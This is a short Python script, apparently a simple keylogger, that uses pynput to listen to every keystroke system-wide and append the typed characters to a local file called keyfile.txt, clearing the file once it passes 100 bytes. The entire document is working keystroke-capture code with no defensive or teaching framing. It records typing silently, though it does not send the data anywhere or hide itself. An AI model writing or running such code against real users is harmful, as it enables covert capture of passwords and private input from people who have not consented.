from pynput import keyboard
import os

def keypressed(key):
    max_size = 100  # Maximum file size in bytes (e.g., 100 bytes)

    # Check the size of the file
    if os.path.exists("keyfile.txt"):
        if os.path.getsize("keyfile.txt") >= max_size:
            # Erase the file's content if it exceeds the max size
            with open("keyfile.txt", "w") as f:
                f.truncate(0)  # This clears the file content
            print("File size limit reached. Data cleared.")

    # Proceed to write new data to the file
    with open("keyfile.txt", "a") as f:
        try:
            char = key.char
            if char is not None:
                f.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                print(f'Special key {key} pressed')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
